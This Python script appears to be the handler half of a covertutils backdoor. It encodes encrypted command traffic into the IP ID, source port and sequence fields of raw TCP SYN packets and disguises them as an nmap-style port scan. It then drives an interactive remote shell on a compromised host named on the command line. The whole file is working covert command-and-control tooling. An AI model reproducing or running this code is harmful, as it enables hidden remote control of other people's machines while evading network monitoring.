from covertutils.datamanipulation import DataTransformer
from covertutils.datamanipulation import StegoInjector

from covertutils.orchestration import SimpleOrchestrator

from covertutils.handlers import ResponseOnlyHandler

from covertutils.handlers.impl import StandardShellHandler

from covertutils.shells.impl import StandardShell

import socket
import threading
import Queue
import sys
import struct

nmap_index = 0
nmap_ports = [80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900,1025,587,8888,199,1720,465,548,113,81,6001,10000,514,5060,179,1026,2000,8443,8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,990,5357,427,49156,543,544,5101,144,7,389,8009,3128,444,9999,5009,7070,5190,3000,5432,3986,1900,13,1029,9,6646,5051,49157,1028,873,1755,2717,4899,9100,119,37,1000,3001,5001,82,10010,1030,9090,2107,1024,2103,6004,1801,5050,19,8031,1041,255,3703,2967,1065,1064,1056,1054,1053,1049,1048,17,808,3689,1031,1071,1044,5901,9102,100,9000,8010,5120,4001,2869,1039,2105,636,1038,2601,7000,1,1069,1066,625,311,280,254,4000,5003,1761,2002,2005,1998,1032,1050,6112,3690,1521,2161,6002,1080,2401,902,4045,7937,787,1058,2383,32771,1059,1040,1033,50000,5555,10001,1494,593,3,2301,7938,3268,1234,1022,9001,8002,1074,1037,1036,1035,464,6666,497,2003,1935,6543,24,1352,3269,1111,500,407,20,2006,3260,15000,1218,1034,4444,264,33,2004,42510,1042,999,3052,1023,222,1068,888,7100,563,1717,992,32770,2008,7001,32772,8082,2007,5550,5801,512,2009,1043,7019,50001,2701,1700,4662,2065,42,2010,9535,3333,2602,161,5100,5002,4002,2604,9595,9594,9593,9415,8701,8652,8651,8194,8193,8192,8089,6789,65389,65000,64680,64623,6059,55600,55555,52869,5226,5225,4443,35500,33354,3283,32769,2702,23502,20828,16993,16992,1311,1062,1060,1055,1052,1051,1047,13782,1067,5902,366,9050,85,5500,1002,8085,5431,51103,49999,45100,1864,1863,10243,49,90,6667,6881,27000,1503,8021,340,1500,9071,8899,8088,5566,2222,9876,9101,6005,5102,32774,32773,1501,5679,163,648,1666,146,901,83,9207,8084,8083,8001,5214,5004,3476,14238,912,30,12345,2605,2030,6,541,8007,4,3005,1248,880,306,2500,9009,8291,52822,4242,2525,1097,1088,1086,900,6101,7200,2809,987,800,32775,211,12000,1083,705,711,20005,6969,13783,9968,9900,9618,9503,9502,9500,9485,9290,9220,9080,9011,9010,9002,8994,8873,8649,8600,8402,8400,8333,8222,8181,8087,8086,7911,7778,7777,7741,7627,7625,7106,6901,6788,6580,65129,6389,63331,6156,6129,6123,60020,5989,5988,5987,5962,5961,5960,5959,5925,5911,5910,5877,5825,5810,58080,57294,5718,5633,5414,5269,5222,50800,5030,50006,50003,49160,49159,49158,48080,4449,4129,4126,40193,4003,3998,3827,3801,3784,3766,3659,3580,3551,34573,34572,34571,3404,33899,3367,3351,3325,3323,3301,3300,32782,32781,3211,31038,3071,30718,3031,3017,30000,2875,28201,2811,27715,2718,2607,25734,2492,24800,2399,2381,22939,2260,2190,2160,21571,2144,2135,2119,2100,20222,20221,20031,20000,19842,19801,1947,19101,1840,17988,1783,1718,1687,16018,16016,16001,15660,15003,15002,14442,14000,13456,1310,1272,11967,1169,1148,11110,1108,1107,1106,1104,1100,1099,1098,1096,1094,1093,1085,1082,1081,1079,1078,1077,1075,1073,1072,1070,1063,10629,10628,10626,10621,1061,10617,10616,1057,10566,1046,1045,10025,10024,10012,10002,89,691,32776,212,2020,1999,1001,7002,6003,50002,2998,898,5510,3372,32,2033,99,749,5903,425,7007,6502,6106,5405,458,43,13722,9998,9944,9943,9877,9666,9110,9091,8654,8500,8254,8180,8100,8090,8011,7512,7443,7435,7402,7103,62078,61900,61532,5963,5922,5915,5904,5859,5822,56738,55055,5298,5280,5200,51493,50636,5054,50389,49175,49165,49163,4446,4111,4006,3995,3918,3880,3871,3851,3828,3737,3546,3493,3371,3370,3369,32784,3261,3077,3030,3011,27355,27353,27352,2522,24444,2251,2191,2179,2126,19780,19315,19283,18988,1782,16012,1580,15742,1334,1296,1247,1186,1183,1152,1124,1089,1087,10778,10004,9040,32779,32777,1021,700,666,616,32778,2021,84,5802,545,49400,4321,38292,2040,1524,1112,32780,3006,2111,2048,1600,1084,9111,6699,6547,2638,16080,801,720,667,6007,5560,555,2106,2034,1533,1443,9917,9898,9878,9575,9418,9200,9099,9081,9003,8800,8383,8300,8292,8290,8200,8099,8093,8045,8042,8022,7999,7921,7920,7800,7676,7496,7025,6839,6792,6779,6692,6689,6567,6566,6565,6510,6100,60443,6025,5952,5950,5907,5906,5862,5850,5815,5811,57797,5730,5678,56737,5544,55056,5440,54328,54045,52848,52673,5221,5087,5080,5061,50500,5033,50300,49176,49167,49161,4900,4848,4567,4550,44501,4445,44176,4279,41511,40911,4005,4004,3971,3945,3920,3914,3905,3889,3878,3869,3826,3814,3809,3800,3527,3517,3390,3324,3322,32785,32783,3221,3168,30951,3003,2909,27356,2725,26214,2608,25735,2394,2393,2323,19350,1862,18101,18040,17877,16113,16000,15004,14441,1271,12265,12174,1201,1199,1175,1151,1138,1131,1122,1119,1117,1114,11111,1091,1090,10215,10180,10009,10003,981,777,722,714,70,6346,617,4998,4224,417,2022,1009,765,668,5999,524,301,2041,1076,10082,7004,6009,44443,4343,416,259,2068,2038,1984,1434,1417,1007,911,9103,726,7201,687,6006,4125,2046,2035,1461,109,1010,903,683,6669,6668,481,2047,2043,2013,1455,125,1011,9929,843,783,5998,44442,406,31337,256,2045,2042,9988,9941,9914,9815,9673,9643,9621,9600,9501,9444,9443,9409,9198,9197,9191,9098,8996,8987,8889,8877,8766,8765,8686,8676,8675,8648,8540,8481,8385,8294,8293,8189,8098,8097,8095,8050,8019,8016,8015,7929,7913,7900,7878,7770,7749,7744,7725,7438,7281,7278,7272,7241,7123,7080,7051,7050,7024,6896,6732,6711,6600,6550,65310,6520,6504,6500,6481,6247,6203,61613]

# with open('stego_config.py','r') as sc_file :
# 	stego_config = sc_file.read()
stego_config = """
K:_data_:_data_		# Source IP
L:_data_:_data_		# Destination IP

M:_data_:_data_		# Source Port
N:_data_:_data_		# Destination Port

R:_data_:_data_		# Sequence Number
P:_data_:_data_		# Acknowledge Number

Q:_data_:_data_		# IP Identification Field
W:_data_:_data_		# TCP flags

ip_tcp_syn='''
45000014QQQQ000040007aeaKKKKKKKKLLLLLLLL	# IP header
MMMMNNNNRRRRRRRRPPPPPPPP50WW200000000000	# TCP header
'''
"""

ins_sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x800))
out_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
out_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

try :
	handler_ip = sys.argv[1]
	client_ip = sys.argv[2]
	passphrase = sys.argv[3]
except :
	print ("Example:")
	print ("	%s <LHOST> <RHOST> <PASSPHRASE>" % sys.argv[0])
	sys.exit(0)

steg_inj = StegoInjector(stego_config)

orchestrator = SimpleOrchestrator( passphrase,
							tag_length = 3,
							in_length = 6,
							out_length = 8,
							reverse = True,
							)
packets = Queue.Queue()


def check_syn( pkt ) :
	pkt = pkt.encode('hex')
	tcp_flags = pkt[94:96]
	return tcp_flags == '14'

def check_empty_tcp( pkt ) :
	return len(pkt) <= 54		# Ethernet 14bytes + IP 20bytes + TCP 20bytes

def strip_pkt( pkt ) :
	return pkt[14:]

def collect_tcp_syns() :
	global packets
	while True :
		pkt = ins_sock.recv(2048)
		if check_syn( pkt ) :
			packets.put( strip_pkt(pkt) )

pkt_collection_thread = threading.Thread( target = collect_tcp_syns )
pkt_collection_thread.daemon = True
pkt_collection_thread.start()

resp = None

def recv( ) :		# Networking Wrapper function needed for the handler
	global resp
	pkt = packets.get()
	data_dict = steg_inj.extractByTag(pkt, 'ip_tcp_syn')
	raw_data = data_dict['Q'] + data_dict['R']
	return raw_data		# Return the raw data to Handler

#	Typical IP/TCP SYN packet made with scapy:
#	>>> print str(IP()TCP()).encode('hex')
pkt_template = '450000280001000040067ccd7f0000017f00000100140050000000000000000050022000917c0000'.decode('hex')

def send( raw_data ) :
	global nmap_index
	if nmap_index > len(nmap_ports) :
		nmap_index = 0
	data_dict = {
		'Q' : raw_data[0:2],	#	 -
		'M' : raw_data[2:4],	#	|	Injecting the payload
		'R' : raw_data[4:8],	#	 -
		'P' : '\x00' * 4,		# ACK number is 0 in a SYN packet
		'N' : struct.pack("!H",nmap_ports[nmap_index]),		# "Scanning" nmap 1000 most common
		# 'N' : '\x00\x20',		# "Scanning" port 32
		'L' : socket.inet_aton(client_ip),	# Destination IP
		'K' : socket.inet_aton(handler_ip),	# Source IP
		'W' : '\x02', 	# SYN	# Set the TCP flag as SYN
	}
	nmap_index += 1
	pkt = steg_inj.injectByTag(data_dict, template = 'ip_tcp_syn', pkt = pkt_template)
	out_sock.sendto( pkt, (client_ip, 0) )

#	ResponseOnlyHandler because the Agent never sends packet adHoc but only as responses
#		(Except if we use adHocSend() by hand - later in Shell creation)
class Handler( ResponseOnlyHandler ) :

	def onMessage( self, stream, message ) :	# When a Message arrives
		# The PrintShell class will automatically handle the response (print it to the user)
		pass

	def onChunk( self, stream, message ) :	# When a Chunk arrives
		# print "[+] Got a Chunk"
		if not message :	# If it is not a complete message (but a part of one)
			self.queueSend( self.request_data, stream )	# Add a message to the send queue
			super( Handler, self ).onMessage( stream, self.request_data  )	# Run the ResponseOnlyHandler onMessage
			# That automatically responds with the next Message in queue when called. (Always responding to messages behavior)

	def onNotRecognised( self ) :	# When Junk arrives
		# print "[!] Unrecognised"
		pass			# Do nothing


handler = Handler( recv, send, orchestrator )	# Instantiate the Handler object. Finally!
handler.preferred_send = handler.sendAdHoc	# Change the preferred method to use it with the shell.
# This way the shell will iterate a message sending and the ResponseOnlyHandler will do the ping-pong

#==========================================================================


#============================== Shell Design part ========================

shell = StandardShell( handler,
					ignore_messages = [handler.request_data]	# The 'NOP messages won't be printed
					)
shell.start()
